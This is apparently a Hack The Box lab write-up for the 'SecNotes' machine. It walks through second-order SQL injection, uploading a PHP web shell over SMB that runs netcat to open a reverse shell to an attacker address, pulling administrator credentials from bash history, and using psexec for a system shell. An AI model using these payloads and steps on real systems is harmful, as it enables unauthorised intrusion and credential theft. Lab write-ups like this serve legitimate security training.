---
layout: post
title: Hack The Box - SecNotes
categories: hack-the-box
image: /hackthebox/secnotes/0.png
---
<hr>
### Quick Summary
#### Hey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that's because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It's ip is 10.10.10.97 so let's jump right in.
![](/images/hackthebox/secnotes/0.png)
<hr>
### Nmap
#### We will start with scanning open ports and services with nmap like we always do so `nmap -sV -sT secnotes.htb`
![](/images/hackthebox/secnotes/1.png)
#### And we see http on port 80 and microsoft-ds on 445 which is smb actually.
#### So let's look at what's there on http
<br>
### HTTP
![](/images/hackthebox/secnotes/2.png)
#### A regular login page and there is an option to sign up , So let's sign up and see what's in there.
![](/images/hackthebox/secnotes/3.png)
![](/images/hackthebox/secnotes/4.png)
#### After we login we see this regular page : "Viewing Secure Notes for *Username*" , and there are some options like creating a note , changing password , sign out and contact. Of course we will do regular enumeration like checking for directories ,checking web vulnerabilities and stuff like that but i will just jump into the thing.
<br>
<hr>
### SQLI
#### If we tried to do sql injection in the registration form , it will work after we login (second order sqli). A simple payload like `OR 1 OR` :
![](/images/hackthebox/secnotes/5.png)
![](/images/hackthebox/secnotes/6.png)
#### And after we login we see some notes , most importantly "new site" :
![](/images/hackthebox/secnotes/7.png)
#### We smb creds , so the next step is to login with smbclient
<br>
<hr>
### New Site
#### We will login with smbclient :
`smbclient //secnotes.htb/new-site -U "tyler"`
#### Then we will look at the contents of that share with `ls`
```
smb: \> ls
  .                                   D        0  Fri Jan 18 15:25:52 2019
  ..                                  D        0  Fri Jan 18 15:25:52 2019
  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
  Microsoft                           D        0  Fri Jan 18 15:25:52 2019

```
#### We see stuff that is related to an http server , but that's not the server on port 80 , because it had more than just a png picture and html page. If we do another full port scan we will find an http server on port 8808.
#### you can do a full scan by specifying the port range like this `-p-` I already know it's port 8808 so i'm going to scan that port
![](/images/hackthebox/secnotes/8.png)
#### Now if we go to that port we will see a default page :
![](/images/hackthebox/secnotes/9.png)
#### And by looking at the source we see the png image we saw earlier on the smb share.
![](/images/hackthebox/secnotes/10.png)
#### So we can upload our shell to that server through smb then easily get a reverse shell.
<br>
<hr>
### Reverse shell and User
#### We will create a simple php file that executes nc.exe and connects back to us :
```
<?php
system('nc.exe -e cmd.exe 10.10.xx.xx 1337')
?>
```
#### Then we will put it on the server : from smb shell we do `put rev.php` we also need nc.exe . you can get it from [here](https://eternallybored.org/misc/netcat/) then we will do `put nc.exe`
#### Now when we visit secnotes.htb:8808/rev.php our listener should get a callback , and we got a rev shell !
![](/images/hackthebox/secnotes/11.png)
<hr>
### WSL
#### Let's take a look at the admin's Desktop
![](/images/hackthebox/secnotes/12.png)
#### There are some interesting stuff , but `bash.lnk` that's weird because we are on a windows machine , so windows subsystem for linux is installed on this machine. Let's find where is bash.exe
#### We will `cd /windows` then we will do `dir *.exe /b/s | findstr bash` and this will list recursively all the exe files then we will just pick the line that has bash in it , `findstr` is like `grep` in linux
![](/images/hackthebox/secnotes/13.png)
#### And we got the path , let's `cd` to it and execute bash.exe
![](/images/hackthebox/secnotes/14.png)
#### We will get a stable shell with python pty , We see that we are root on this subsystem. if we list the files in `/root` directory we don't see too much files , but we see `.bash_history` which is a very interesting thing to look at if you are enumerating a linux box so let's view that.
![](/images/hackthebox/secnotes/15.png)
<hr>
### Root
#### There's an smbclient command with the administrator creds, we will simply use [impacket](https://github.com/SecureAuthCorp/impacket)'s `psexec.py` to get a root shell , like we did in [Active](/hack-the-box/active/) 
`./psexec.py administrator@secnotes.htb`
![](/images/hackthebox/secnotes/16.png)
#### And we owned root!
<br>
<br>
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### previous Hack The Box write-up : [Hack The Box - Oz](/hack-the-box/oz/)
#### next Hack The Box write-up : [Hack The Box - Dab](/hack-the-box/dab/)
<hr>
